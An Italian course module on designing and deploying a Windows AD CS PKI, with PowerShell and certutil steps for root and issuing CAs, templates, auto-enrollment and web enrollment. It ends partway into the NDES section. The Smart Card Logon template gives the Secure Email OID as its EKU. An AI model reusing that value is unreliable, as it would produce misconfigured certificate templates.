# Servizi Certificati — PKI Windows

> **Modulo 11** · **Aggiornamento:** 2026-05-24

| Campo | Valore |
|---|---|
| **Modulo del corso** | Amministrazione Windows enterprise |
| **Prerequisiti** | Conoscenza di Active Directory e GPO (→ `01-active-directory.md`), familiarità con la sicurezza Windows (→ `05-sicurezza-windows.md`), padronanza di PowerShell base (→ `02-powershell.md`) |
| **Obiettivi di apprendimento** | 1) Progettare una gerarchia PKI a due livelli (offline root CA + issuing CA online) · 2) Configurare certificate templates e auto-enrollment via GPO · 3) Gestire revoca certificati con CRL, delta CRL e OCSP · 4) Implementare key archival con KRA e integrazione HSM · 5) Effettuare audit di sicurezza della PKI e identificare vulnerabilità ESC* |
| **Tempo stimato** | lettura 120 min · lab 110 min |
| **Livello** | Proficient |
| **Ultimo aggiornamento** | 2026-05-24 |

## Idee guida
1. **Two-tier PKI: offline root CA + online issuing CA.**
2. **Cert templates per use case — mai usare template di default in produzione.**
3. **Auto-enrollment via GPO per eliminare provisioning manuale.**
4. **CRL + OCSP per revoca; delta CRL per ridurre banda.**
5. **Key archival per certificati di cifratura — KRA obbligatorio.**
6. **HSM per proteggere la chiave privata della Root CA.**
7. **Monitoraggio scadenze con script schedulati — zero certificati scaduti.**
8. **Audit proattivo delle vulnerabilità ESC* — superficie di attacco AD CS sempre sotto controllo.**
9. **Preparazione post-quantum: inventario cripto-agile e migrazione pianificata a ML-KEM/ML-DSA.**
10. **CBA con Entra ID per autenticazione passwordless e phishing-resistant.**


## Indice

- [Fondamenti PKI](#fondamenti-pki)
- [Catena di Fiducia e Ciclo di Vita](#catena-di-fiducia-e-ciclo-di-vita)
- [Design della Gerarchia CA](#design-della-gerarchia-ca)
- [Installazione AD CS](#installazione-ad-cs)
- [Certificate Templates](#certificate-templates)
- [Enrollment e Auto-Enrollment](#enrollment-e-auto-enrollment)
- [Web Enrollment — CES e CEP](#web-enrollment--ces-e-cep)
- [NDES — Enrollment Dispositivi di Rete](#ndes--enrollment-dispositivi-di-rete)
- [Tipi di Certificato](#tipi-di-certificato)
- [Revoca — CRL e OCSP](#revoca--crl-e-ocsp)
- [Key Archival e Recovery](#key-archival-e-recovery)
- [Autenticazione Basata su Certificati](#autenticazione-basata-su-certificati)
- [Let's Encrypt e Protocollo ACME](#lets-encrypt-e-protocollo-acme)
- [Integrazione HSM](#integrazione-hsm)
- [Monitoraggio Certificati](#monitoraggio-certificati)
- [Migrazione e Disaster Recovery](#migrazione-e-disaster-recovery)
- [Sicurezza e Hardening della CA](#sicurezza-e-hardening-della-ca)
- [Autenticazione Basata su Certificati con Entra ID](#autenticazione-basata-su-certificati-con-entra-id)
- [Key Attestation con TPM 2.0](#key-attestation-con-tpm-20)
- [Preparazione Post-Quantum per la PKI](#preparazione-post-quantum-per-la-pki)
- [Monitoraggio Avanzato e Automazione del Ciclo di Vita](#monitoraggio-avanzato-e-automazione-del-ciclo-di-vita)
- [Gestione Certificati con PowerShell](#gestione-certificati-con-powershell)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [Checklist Deployment PKI](#checklist-deployment-pki)

---

## Fondamenti PKI

### Crittografia Asimmetrica

La PKI si basa sulla crittografia a chiave pubblica (asimmetrica). Ogni entità possiede una coppia di chiavi matematicamente correlate:

- **Chiave pubblica**: distribuita liberamente, usata per cifrare dati e verificare firme digitali.
- **Chiave privata**: custodita segretamente, usata per decifrare dati e generare firme digitali.

```
Cifratura:
  Alice ──[chiave pubblica di Bob]──► Messaggio cifrato ──► Bob ──[chiave privata di Bob]──► Testo in chiaro

Firma digitale:
  Alice ──[chiave privata di Alice]──► Firma ──► Bob ──[chiave pubblica di Alice]──► Verifica OK/FAIL
```

### Cos'è un Certificato Digitale

Un certificato digitale è un documento elettronico firmato da una Certification Authority (CA) che lega un'identità (soggetto) alla relativa chiave pubblica. Il formato standard è X.509v3 (RFC 5280).

```
Struttura di un certificato X.509v3
├── Version                  → 3 (v3)
├── Serial Number            → Identificatore univoco emesso dalla CA
├── Signature Algorithm      → es. sha256WithRSAEncryption
├── Issuer                   → DN della CA che ha emesso il certificato
├── Validity
│   ├── Not Before           → Data di inizio validità
│   └── Not After            → Data di scadenza
├── Subject                  → DN del titolare (CN, O, OU, C...)
├── Subject Public Key Info
│   ├── Algorithm            → RSA, ECDSA, ecc.
│   └── Public Key           → La chiave pubblica del soggetto
├── Extensions (v3)
│   ├── Key Usage            → digitalSignature, keyEncipherment...
│   ├── Enhanced Key Usage   → Server Auth, Client Auth, Code Signing...
│   ├── Subject Alt Name     → DNS names, IP addresses, email
│   ├── CRL Distribution Points → URL dove reperire la CRL
│   ├── Authority Info Access   → URL della CA e/o OCSP
│   ├── Basic Constraints    → isCA (true/false), pathLen
│   └── Subject Key Identifier
└── Signature                → Firma della CA su tutto il certificato
```

### Concetti Chiave

| Termine | Significato |
|---------|-------------|
| **CA (Certification Authority)** | Entità che emette, firma e revoca certificati |
| **RA (Registration Authority)** | Entità che verifica l'identità dei richiedenti per conto della CA |
| **CSR (Certificate Signing Request)** | Richiesta formale di emissione certificato, contiene chiave pubblica e Subject |
| **CRL (Certificate Revocation List)** | Lista dei certificati revocati, firmata dalla CA |
| **OCSP (Online Certificate Status Protocol)** | Protocollo per verificare lo stato di revoca in tempo reale |
| **CDP (CRL Distribution Point)** | URL da cui i client scaricano la CRL |
| **AIA (Authority Information Access)** | URL per raggiungere il certificato della CA e/o l'OCSP responder |
| **SAN (Subject Alternative Name)** | Estensione che consente più identità (DNS, IP, email) in un singolo certificato |
| **KRA (Key Recovery Agent)** | Agente autorizzato a recuperare chiavi private archiviate |
| **HSM (Hardware Security Module)** | Dispositivo hardware dedicato alla protezione delle chiavi crittografiche |

---

## Catena di Fiducia e Ciclo di Vita

### Chain of Trust

La fiducia in un certificato non è diretta: è transitiva, basata su una catena gerarchica. Un client si fida di un certificato end-entity solo se riesce a costruire una catena ininterrotta fino a una Root CA presente nel proprio trust store.

```
┌───────────────────────────────┐
│   Root CA Certificate          │  ← Self-signed, trust anchor
│   Validity: 20 anni            │     Presente nel Trusted Root
│   CN=Corp-Root-CA              │     Certification Authorities store
└──────────────┬────────────────┘
               │ firma
               ▼
┌───────────────────────────────┐
│   Subordinate/Issuing CA       │  ← Firmato dalla Root CA
│   Certificate                  │     Trust transitivo
│   Validity: 10 anni            │
│   CN=Corp-Issuing-CA           │
└──────────────┬────────────────┘
               │ firma
               ▼
┌───────────────────────────────┐
│   End-Entity Certificate       │  ← Firmato dalla Issuing CA
│   (utente, computer, servizio) │     Certificato operativo
│   Validity: 1-2 anni           │
│   CN=webapp.corp.contoso.com   │
└───────────────────────────────┘
```

**Validazione della catena** — il client esegue questi controlli per ogni certificato nella catena:

1. La firma è valida (integrità crittografica).
2. Il certificato non è scaduto (`NotBefore` ≤ ora corrente ≤ `NotAfter`).
3. Il certificato non è revocato (CRL o OCSP).
4. Le estensioni `Basic Constraints` permettono la firma CA.
5. Il `pathLenConstraint` non è violato.
6. Il `Key Usage` include `keyCertSign` per i certificati CA.
7. Il `Name Constraints` (se presente) consente il Subject.

### Ciclo di Vita del Certificato

```
┌──────────┐     ┌───────────┐     ┌──────────┐     ┌──────────┐
│ Richiesta │ ──► │ Emissione │ ──► │ Utilizzo │ ──► │ Scadenza │
│ (CSR)     │     │ (CA firma)│     │ (attivo) │     │ o Revoca │
└──────────┘     └───────────┘     └──────────┘     └──────────┘
     │                                    │               │
     ▼                                    ▼               ▼
  Generazione                        Rinnovo          Archiviazione
  coppia chiavi                      (re-key o        (chiave in
                                      same key)       KRA se cifr.)
```

Fasi dettagliate:

1. **Generazione chiavi**: il richiedente genera la coppia di chiavi (o la CA la genera per lui se key archival è attivo).
2. **Richiesta (Enrollment)**: il richiedente invia un CSR alla CA.
3. **Validazione**: la CA (o RA) verifica l'identità e le policy del template.
4. **Emissione**: la CA firma il certificato e lo restituisce al richiedente.
5. **Distribuzione**: il certificato viene installato nel certificate store dell'host.
6. **Utilizzo**: il certificato viene usato per autenticazione, cifratura, firma, ecc.
7. **Rinnovo**: prima della scadenza, il certificato può essere rinnovato (con nuova chiave o stessa chiave).
8. **Revoca**: se compromesso o non più necessario, la CA lo inserisce nella CRL.
9. **Scadenza**: raggiunta la data `NotAfter`, il certificato non è più valido.
10. **Archiviazione**: per certificati di cifratura, la chiave privata può essere archiviata nel database CA tramite KRA.

---

## Design della Gerarchia CA

### Two-Tier (Raccomandato per la Maggior Parte degli Ambienti)

```
Root CA (Offline, Standalone)
├── Tipo: Standalone CA
├── Stato: SPENTA (accesa solo per firmare subordinate o CRL)
├── Non joinata al dominio
├── Certificato: 20 anni
├── CRL: pubblicata ogni 6-12 mesi
├── Chiave: RSA 4096 bit, SHA-256
└── Sicurezza: VM offline o macchina fisica in cassaforte / HSM

└── Issuing CA (Online, Enterprise)
    ├── Tipo: Enterprise CA (integrata con AD)
    ├── Stato: sempre online, gestisce le richieste
    ├── Joinata al dominio
    ├── Certificato: 10 anni (firmato dalla Root)
    ├── CRL: pubblicata ogni 1-7 giorni + delta CRL
    ├── Auto-enrollment per utenti e computer
    └── Ridondanza: 2 Issuing CA per HA

Vantaggi Two-Tier:
- Root CA offline → compromissione della Issuing CA non compromette la Root
- Si può revocare e sostituire la Issuing CA senza ricostruire l'intera PKI
- La Root CA firma solo certificati CA subordinate (minima esposizione)
- Conformità con le raccomandazioni Microsoft e industry best practices
```

### Three-Tier (Grandi Organizzazioni / Regolamentate)

```
Root CA (Offline)
├── Validità: 20-25 anni
├── Emette solo certificati per Policy CA
└── In cassaforte, accesa 1-2 volte l'anno

└── Policy CA (Offline o semi-online)
    ├── Validità: 15 anni
    ├── Definisce le certificate policy (CP) e certification practice statement (CPS)
    ├── Può implementare Name Constraints
    └── Può essere separata per area geografica o divisione

    └── Issuing CA (Online, Enterprise)
        ├── Validità: 5-10 anni
        ├── Emette certificati end-entity
        └── Integrata con AD, auto-enrollment

Quando usare Three-Tier:
- Organizzazioni con 50.000+ utenti
- Requisiti normativi (PCI-DSS, HIPAA, eIDAS)
- Presenza multinazionale con policy diverse per regione
- Necessità di cross-certification con CA esterne
```

### Cross-Certification

La cross-certification permette a due gerarchie PKI indipendenti di fidarsi reciprocamente. Si realizza firmando il certificato CA della controparte con la propria CA.

```powershell
# Scenario: Fiducia tra Corp-PKI e Partner-PKI

# 1. Partner invia il certificato della propria Root CA
# 2. La nostra Root CA emette un cross-certificate per la Root CA del partner
#    (Qualified Subordination con Name Constraints)

# Pubblicare cross-certificate in AD
certutil -dspublish -f PartnerRootCA.cer CrossCA

# Verificare la trust chain
certutil -verify -urlfetch partner-server.cer
```

### Single-Tier (Solo Lab/Test)

```
ATTENZIONE: Mai in produzione!

Single CA (Root + Issuing nella stessa macchina)
├── Tipo: Enterprise Root CA
├── La CA è sia root che emittente
├── Se compromessa, l'intera PKI è persa
├── Non è possibile sostituire senza ricostruire tutto
└── Accettabile SOLO per lab, test, sviluppo
```

---

## Installazione AD CS

### Prerequisiti

```
Prima di installare AD CS:
├── Windows Server 2019/2022/2025 (Standard o Datacenter)
├── Membership nel gruppo Enterprise Admins (per Enterprise CA)
├── DNS funzionante e risoluzione corretta
├── Per Enterprise CA: almeno un Domain Controller disponibile
├── IIS installato (se si vuole Web Enrollment)
├── Firewall rules:
│   ├── TCP 135 (RPC endpoint mapper)
│   ├── TCP 49152-65535 (RPC dynamic)
│   ├── TCP 443 (HTTPS per CES/CEP)
│   └── TCP 80 (HTTP per CRL/AIA)
└── Storage: almeno 10 GB per il database CA + log
```

### Root CA (Offline, Standalone)

```powershell
# Su un server standalone (NON nel dominio)
# Idealmente una VM che verrà spenta dopo la configurazione

# Installare il ruolo
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools

# Configurare come Root CA Standalone
Install-AdcsCertificationAuthority -CAType StandaloneRootCA `
    -CACommonName "Corp-Root-CA" `
    -CADistinguishedNameSuffix "O=Contoso,L=Roma,C=IT" `
    -KeyLength 4096 `
    -HashAlgorithmName SHA256 `
    -ValidityPeriod Years -ValidityPeriodUnits 20 `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -Force

# Configurare la validità dei certificati emessi dalla Root CA
# (i certificati delle Subordinate CA)
certutil -setreg CA\ValidityPeriod Years
certutil -setreg CA\ValidityPeriodUnits 10

# Configurare CRL (pubblicazione ogni 6 mesi)
certutil -setreg CA\CRLPeriod Months
certutil -setreg CA\CRLPeriodUnits 6
certutil -setreg CA\CRLOverlapPeriod Weeks
certutil -setreg CA\CRLOverlapUnits 2

# Disabilitare delta CRL sulla Root CA (non necessaria)
certutil -setreg CA\CRLDeltaPeriodUnits 0

# Configurare CDP (CRL Distribution Points)
# Rimuovere CDP di default e aggiungere HTTP
# In certsrv.msc → Properties → Extensions → CDP:
# http://pki.corp.contoso.com/CertEnroll/<CaName><CRLNameSuffix><DeltaCRLAllowed>.crl

# Configurare AIA (Authority Information Access)
# http://pki.corp.contoso.com/CertEnroll/<ServerDNSName>_<CaName><CertificateName>.crt

# Pubblicare CRL
certutil -CRL

# Esportare certificato Root CA
certutil -ca.cert C:\RootCA.cer

# Esportare CRL
certutil -getcrl C:\RootCA.crl

# Copiare RootCA.cer e RootCA.crl su USB per trasferimento alla Issuing CA

# IMPORTANTE: Dopo la configurazione, SPEGNERE la Root CA
# Accenderla SOLO per:
# - Rinnovare il certificato della Issuing CA
# - Pubblicare nuova CRL (ogni 6 mesi)
# - Emettere certificato per nuova Subordinate CA
```

### Issuing CA (Enterprise Subordinate)

```powershell
# Su un server MEMBER del dominio
# Questo server rimarrà sempre online

# Installare ruoli
Install-WindowsFeature ADCS-Cert-Authority, ADCS-Web-Enrollment `
    -IncludeManagementTools

# PRIMA: importare il certificato Root CA e la CRL in Active Directory
# Questo distribuisce la trust a tutti i computer del dominio
certutil -dspublish -f C:\RootCA.cer RootCA
certutil -addstore -f Root C:\RootCA.cer
certutil -addstore -f Root C:\RootCA.crl

# Pubblicare la CRL della Root CA nel CDP HTTP
# Copiare RootCA.crl nella directory web del CDP
# es. C:\inetpub\wwwroot\CertEnroll\

# Installare come Enterprise Subordinate CA
Install-AdcsCertificationAuthority -CAType EnterpriseSubordinateCA `
    -CACommonName "Corp-Issuing-CA" `
    -CADistinguishedNameSuffix "O=Contoso,L=Roma,C=IT" `
    -KeyLength 4096 `
    -HashAlgorithmName SHA256 `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -Force

# Il comando genera un file .req (CSR) che deve essere firmato dalla Root CA

# Procedura di firma:
# 1. Copiare il file .req sulla Root CA (USB)
# 2. Sulla Root CA (accenderla):
#    certreq -submit Corp-Issuing-CA.req
#    (selezionare la CA dalla lista, confermare l'emissione)
# 3. Esportare il certificato emesso:
#    certutil -view → individuare il certificato → export
# 4. Pubblicare nuova CRL sulla Root CA:
#    certutil -CRL
# 5. Copiare certificato firmato + CRL aggiornata sulla Issuing CA (USB)
# 6. Spegnere la Root CA

# Sulla Issuing CA, installare il certificato firmato
certutil -installcert C:\IssuingCA.cer

# Avviare il servizio
Start-Service CertSvc

# Configurare CRL
certutil -setreg CA\CRLPeriod Days
certutil -setreg CA\CRLPeriodUnits 7
certutil -setreg CA\CRLOverlapPeriod Days
certutil -setreg CA\CRLOverlapUnits 3

# Abilitare delta CRL (aggiornamenti incrementali)
certutil -setreg CA\CRLDeltaPeriod Days
certutil -setreg CA\CRLDeltaPeriodUnits 1

# Configurare CDP e AIA
# certsrv.msc → Properties → Extensions
# CDP: http://pki.corp.contoso.com/CertEnroll/<CaName><CRLNameSuffix><DeltaCRLAllowed>.crl
# AIA: http://pki.corp.contoso.com/CertEnroll/<ServerDNSName>_<CaName><CertificateName>.crt
# AIA OCSP: http://ocsp.corp.contoso.com/ocsp

# Riavviare il servizio dopo le modifiche
Restart-Service CertSvc

# Pubblicare CRL e delta CRL
certutil -CRL

# Verificare che la CA sia funzionante
certutil -ping
certutil -CAInfo
```

### Standalone Subordinate CA (Uso Specifico)

```powershell
# Una Standalone Subordinate CA non è integrata con AD
# Usata per:
# - Emettere certificati per entità non-AD (DMZ, partner, IoT)
# - Policy CA in architettura three-tier
# - CA per ambienti isolati

Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools

Install-AdcsCertificationAuthority -CAType StandaloneSubordinateCA `
    -CACommonName "Corp-DMZ-CA" `
    -KeyLength 4096 `
    -HashAlgorithmName SHA256 `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -Force

# NOTA: una Standalone CA non supporta auto-enrollment
# Tutti i certificati devono essere richiesti manualmente
# Non pubblica template in AD
```

### Installazione Web Enrollment

```powershell
# Il portale web enrollment consente richieste certificato via browser
# URL: https://ca-server.corp.contoso.com/certsrv

# Se non installato durante l'installazione della CA:
Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools
Install-AdcsWebEnrollment -Force

# Configurare HTTPS per il sito Web Enrollment
# (richiede un certificato SSL/TLS per il server IIS)

# Verificare funzionamento
# Aprire https://ca-server/certsrv in un browser
# Opzioni disponibili:
# - Request a Certificate
# - View the Status of a Pending Certificate Request
# - Download a CA Certificate, Certificate Chain, or CRL
```

---

## Certificate Templates

### Versioni dei Template

```
Template v1 (Windows 2000/2003):
├── Non possono essere modificati (solo duplicati)
├── Subject Name: solo da AD
├── Nessun supporto per auto-enrollment utente
├── Esempi: User, Computer, Domain Controller
└── Chiavi non esportabili

Template v2 (Windows Server 2003 Enterprise):
├── Possono essere duplicati e personalizzati
├── Subject Name: da AD o specificato dal richiedente
├── Supporto auto-enrollment per utenti e computer
├── Supporto key archival
├── Supporto Application Policies
└── La maggior parte dei template personalizzati sono v2

Template v3 (Windows Server 2008):
├── Tutto ciò che offre v2, più:
├── Supporto CNG (Cryptography Next Generation)
├── Suite B cryptography (ECDSA, ECDH)
├── Supporto SHA-256/384/512
└── Richiede client Windows Vista+ per l'enrollment

Template v4 (Windows Server 2012):
├── Tutto ciò che offre v3, più:
├── Supporto key attestation (TPM)
├── Supporto renewal with same key
├── Cryptographic Service Provider (CSP) / KSP selection migliorato
└── Richiede client Windows 8+ per l'enrollment
```

### Gestione Template

```powershell
# I template sono oggetti in AD: CN=Certificate Templates,CN=Public Key Services,
# CN=Services,CN=Configuration,DC=corp,DC=contoso,DC=com

# Elencare template pubblicati sulla CA
certutil -catemplates

# Elencare TUTTI i template in AD (anche non pubblicati)
certutil -template

# Visualizzare dettagli di un template
certutil -template "WebServer" -v

# Template comuni built-in:
# ┌─────────────────────────┬──────────────────────────────────────────┐
# │ Template                │ Uso                                      │
# ├─────────────────────────┼──────────────────────────────────────────┤
# │ Computer                │ Autenticazione computer nel dominio      │
# │ User                    │ Autenticazione utente, EFS, email        │
# │ Web Server              │ SSL/TLS per web server                   │
# │ Domain Controller       │ Autenticazione e replica DC              │
# │ Code Signing            │ Firma digitale del codice                │
# │ IPSec                   │ Autenticazione IPSec tunnel              │
# │ Enrollment Agent        │ Enrollment per conto di altri utenti     │
# │ Administrator           │ EFS recovery, code signing per admin     │
# │ EFS Recovery Agent      │ Recupero file cifrati con EFS            │
# │ OCSP Response Signing   │ Firma risposte OCSP                     │
# │ Smartcard Logon         │ Autenticazione con smart card            │
# │ Smartcard User          │ Smart card + email firma/cifratura       │
# │ Kerberos Authentication │ DC authentication (sostituisce Domain    │
# │                         │ Controller in ambienti moderni)          │
# └─────────────────────────┴──────────────────────────────────────────┘

# Pubblicare un template sulla CA (rende il template disponibile per l'enrollment)
Add-CATemplate -Name "CorpWebServer" -Force

# Rimuovere un template dalla CA (non lo cancella da AD, solo non più emesso)
Remove-CATemplate -Name "CorpWebServer" -Force
```

### Creazione di un Template Personalizzato

```
La creazione avviene tramite duplicazione di un template esistente.

Procedura (certtmpl.msc):
1. Aprire certtmpl.msc (Certificate Templates Console)
2. Tasto destro sul template base → Duplicate Template
3. Scegliere la versione del template (v2 consigliato per compatibilità)
4. Configurare ogni tab:

Tab General:
├── Template display name: Corp Web Server SSL
├── Template name (auto-generato, usato in script): CorpWebServerSSL
├── Validity period: 2 years
├── Renewal period: 6 weeks (il client richiede rinnovo 6 settimane prima)
└── Publish certificate in Active Directory: opzionale

Tab Request Handling:
├── Purpose: Signature and encryption
├── Allow private key to be exported: Yes (per cluster / load balancer)
├── Delete revoked or expired certificates: No (mantenere storico)
├── Include symmetric algorithms: No (default)
└── Archive subject's encryption private key: No (sì solo per cifratura)

Tab Cryptography:
├── Provider Category: Key Storage Provider (KSP) o Legacy CSP
├── Algorithm name: RSA
├── Minimum key size: 2048 (4096 per alta sicurezza)
├── Hash: SHA256
└── Use alternate signature format: No

Tab Subject Name:
├── Supply in the request → Per specificare SAN manualmente
│   (necessario per certificati web con nomi multipli)
└── Build from Active Directory information → Per auto-enrollment
    ├── Subject name format: Fully distinguished name / Common name
    ├── Include e-mail name in subject / SAN
    └── DNS name: incluso nel SAN

Tab Security (Permissions):
├── Authenticated Users: Read
├── GG-WebAdmins: Read, Enroll
├── GG-AutoEnrollComputers: Read, Enroll, Autoenroll
├── Domain Admins: Full Control
└── Enterprise Admins: Full Control

Tab Issuance Requirements:
├── CA certificate manager approval: No (sì per certificati ad alta sicurezza)
├── Number of authorized signatures: 0 (o 1+ per dual approval)
└── Validity period applicant must supply: No

Tab Extensions:
├── Application Policies: Server Authentication (OID 1.3.6.1.5.5.7.3.1)
├── Key Usage: Digital Signature, Key Encipherment
├── Basic Constraints: non-CA
└── Certificate Template Information: auto-populated

Tab Superseded Templates:
└── Specificare quale template questo rimpiazza (migrazione graduale)
```

### Template per Scenari Comuni

```
Template: Corp Client Authentication
├── Base: User
├── Purpose: Autenticazione client (VPN, Wi-Fi 802.1X, DirectAccess)
├── Subject: Build from AD (UPN nel SAN)
├── Key Usage: Digital Signature
├── EKU: Client Authentication (1.3.6.1.5.5.7.3.2)
├── Key Size: 2048
├── Auto-enrollment: Sì (gruppo Domain Users)
└── Validity: 1 anno

Template: Corp S/MIME Email
├── Base: User
├── Purpose: Firma e cifratura email
├── Subject: Build from AD (email nel SAN)
├── Key Usage: Digital Signature, Key Encipherment
├── EKU: Secure Email (1.3.6.1.5.5.7.3.4)
├── Key Size: 2048
├── Key Archival: Sì (per la chiave di cifratura)
├── Auto-enrollment: Sì
└── Validity: 2 anni

Template: Corp Code Signing
├── Base: Code Signing
├── Purpose: Firma script PowerShell, eseguibili, driver
├── Subject: Supply in request
├── Key Usage: Digital Signature
├── EKU: Code Signing (1.3.6.1.5.5.7.3.3)
├── Key Size: 4096
├── CA Manager Approval: Sì (approvazione manuale obbligatoria)
├── Auto-enrollment: No
└── Validity: 3 anni

Template: Corp Smart Card Logon
├── Base: Smartcard Logon
├── Purpose: Autenticazione con smart card / virtual smart card
├── Subject: Build from AD (UPN nel SAN)
├── Key Usage: Digital Signature, Key Encipherment
├── EKU: Smart Card Logon (1.3.6.1.5.5.7.3.4), Client Auth
├── Key Size: 2048
├── CSP: Microsoft Base Smart Card Crypto Provider
├── Auto-enrollment: No (provisioning controllato)
└── Validity: 1 anno
```

### Permessi sui Template

```powershell
# I permessi sui template controllano chi può fare cosa:
#
# Read           → Visualizzare il template
# Enroll         → Richiedere un certificato basato su questo template
# Autoenroll     → Ricevere certificato automaticamente via GPO
# Write          → Modificare il template
# Full Control   → Tutti i permessi

# Verificare permessi su un template via PowerShell
$templateName = "CorpWebServerSSL"
$configContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$templateDN = "CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configContext"
$template = [ADSI]"LDAP://$templateDN"
$template.ObjectSecurity.Access | Format-Table IdentityReference, AccessControlType, ActiveDirectoryRights

# Aggiungere permesso Enroll a un gruppo
Import-Module ActiveDirectory
$acl = Get-Acl "AD:\$templateDN"
$group = New-Object System.Security.Principal.NTAccount("CORP\GG-WebAdmins")
$enrollGuid = [Guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"  # Enroll
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $group, "ExtendedRight", "Allow", $enrollGuid
)
$acl.AddAccessRule($ace)
Set-Acl "AD:\$templateDN" $acl
```

---

## Enrollment e Auto-Enrollment

### Auto-Enrollment via GPO

```powershell
# L'auto-enrollment permette ai computer e utenti di ottenere
# certificati automaticamente, senza intervento manuale.
# È il metodo PREFERITO per il deployment di certificati enterprise.

# Prerequisiti:
# 1. Template deve avere permesso "Autoenroll" per il gruppo target
# 2. Template deve essere pubblicato sulla CA (Add-CATemplate)
# 3. GPO configurata per abilitare auto-enrollment

# Configurazione GPO:
#
# Computer Configuration → Windows Settings → Security Settings →
#   Public Key Policies → Certificate Services Client - Auto-Enrollment
#     → Configuration Model: Enabled
#     → Renew expired certificates, update pending, remove revoked: Checked
#     → Update certificates that use certificate templates: Checked
#
# User Configuration → Windows Settings → Security Settings →
#   Public Key Policies → Certificate Services Client - Auto-Enrollment
#     (stesse impostazioni per i certificati utente)

# Forzare enrollment immediato
certutil -pulse    # Trigger auto-enrollment cycle
gpupdate /force    # Refresh GPO

# Verificare che l'auto-enrollment sia attivo
# Event Viewer → Applications and Services Logs →
#   Microsoft → Windows → CertificateServicesClient-AutoEnrollment

# Log di auto-enrollment
certutil -enrollmentServerURL
```

### Come Funziona Auto-Enrollment

```
Processo di auto-enrollment (passo per passo):

1. Il client riceve la GPO con auto-enrollment abilitato
2. Il client enumera i template pubblicati sulle CA enterprise
3. Per ogni template:
   a. Verifica di avere il permesso Autoenroll
   b. Verifica se ha già un certificato valido per quel template
   c. Se non lo ha (o è in fase di rinnovo), genera un CSR
   d. Invia il CSR alla CA
4. La CA valida la richiesta:
   a. Verifica i permessi del richiedente
   b. Verifica le policy del template (approvazione, firme richieste)
   c. Se tutto OK, emette il certificato
5. Il client riceve e installa il certificato nel proprio store
6. Il ciclo si ripete a ogni gpupdate (default: ogni 90 minuti)

Trigger di auto-enrollment:
├── Startup del computer (per certificati macchina)
├── Logon dell'utente (per certificati utente)
├── gpupdate (manuale o schedulato ogni 90 min)
├── certutil -pulse (trigger manuale)
└── Task schedulato Certificate Services Client
```

### Enrollment Manuale

```powershell
# Via GUI: certlm.msc (computer) o certmgr.msc (utente)
# Personal → Certificates → tasto destro → Request New Certificate
# → Active Directory Enrollment Policy → selezionare template → Enroll

# Via riga di comando con file INF
# Creare file request.inf:
$inf = @"
[Version]
Signature = "`$Windows NT$"

[NewRequest]
Subject = "CN=webapp.corp.contoso.com,O=Contoso,L=Roma,C=IT"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = TRUE
KeySpec = 1
KeyUsage = 0xa0
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
RequestType = PKCS10
HashAlgorithm = SHA256
FriendlyName = "Corp Web App Certificate"

[EnhancedKeyUsageExtension]
OID = 1.3.6.1.5.5.7.3.1  ; Server Authentication

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "dns=webapp.corp.contoso.com&"
_continue_ = "dns=webapp&"
_continue_ = "dns=api.corp.contoso.com"

[RequestAttributes]
CertificateTemplate = CorpWebServerSSL
"@
$inf | Out-File "C:\Certs\request.inf" -Encoding ASCII

# Generare CSR
certreq -new "C:\Certs\request.inf" "C:\Certs\request.req"

# Inviare alla CA (se Enterprise CA, il template è nel CSR)
certreq -submit -config "CA-SERVER\Corp-Issuing-CA" `
    "C:\Certs\request.req" "C:\Certs\response.cer"

# Installare certificato
certreq -accept "C:\Certs\response.cer"

# Verificare
Get-ChildItem Cert:\LocalMachine\My | Where-Object Subject -like "*webapp*"
```

---

## Web Enrollment — CES e CEP

### Certificate Enrollment Web Service (CES)

```powershell
# CES consente l'enrollment via HTTPS, utile per:
# - Client non nel dominio (BYOD, partner, DMZ)
# - Client in reti remote senza connettività diretta alla CA
# - Scenari Workplace Join

# Installare CES
Install-WindowsFeature ADCS-Enroll-Web-Svc -IncludeManagementTools

# Configurare CES con autenticazione Kerberos
Install-AdcsEnrollmentWebService -AuthenticationType Kerberos `
    -SSLCertThumbprint (Get-ChildItem Cert:\LocalMachine\My |
        Where-Object Subject -like "*CES*").Thumbprint `
    -Force

# Configurare CES con autenticazione username/password
Install-AdcsEnrollmentWebService -AuthenticationType UserName `
    -SSLCertThumbprint $sslThumbprint `
    -Force

# Configurare CES con autenticazione certificato client
Install-AdcsEnrollmentWebService -AuthenticationType Certificate `
    -SSLCertThumbprint $sslThumbprint `
    -Force
```

### Certificate Enrollment Policy Web Service (CEP)

```powershell
# CEP fornisce le informazioni sulle policy di enrollment ai client
# (quali template sono disponibili, su quali CA)

Install-WindowsFeature ADCS-Enroll-Web-Pol -IncludeManagementTools

Install-AdcsEnrollmentPolicyWebService -AuthenticationType UserName `
    -SSLCertThumbprint $sslThumbprint `
    -Force

# URL risultante:
# https://cep-server.corp.contoso.com/ADPolicyProvider_CEP_UsernamePassword/service.svc/CEP

# Configurare il client per usare CES/CEP
# GPO: Computer/User → Administrative Templates → Windows Components →
#   Certificate Services Client → Certificate Enrollment Policy
#   → Enable = Yes, URI = URL del CEP
```

---

## NDES — Enrollment Dispositivi di Rete

```powershell
# NDES (Network Device Enrollment Service) implementa il protocollo SCEP
# (Simple Certificate Enrollment Protocol) per dispositivi di rete
# che non supportano enrollment AD: router, switch, firewall, access point,
# telefoni VoIP, stampanti, dispositivi IoT, MDM/Intune

# Prerequisiti:
# - Account di servizio NDES (non Domain Admin)
# - Template dedicato (duplicato da "IPSec (Offline request)")
# - IIS installato

# Creare account di servizio
New-ADUser -Name "svc-NDES" -SamAccountName "svc-NDES" `
    -UserPrincipalName "svc-NDES@corp.contoso.com" `
    -AccountPassword (Read-Host -AsSecureString "Password") `
    -PasswordNeverExpires $true -CannotChangePassword $true `
    -Enabled $true

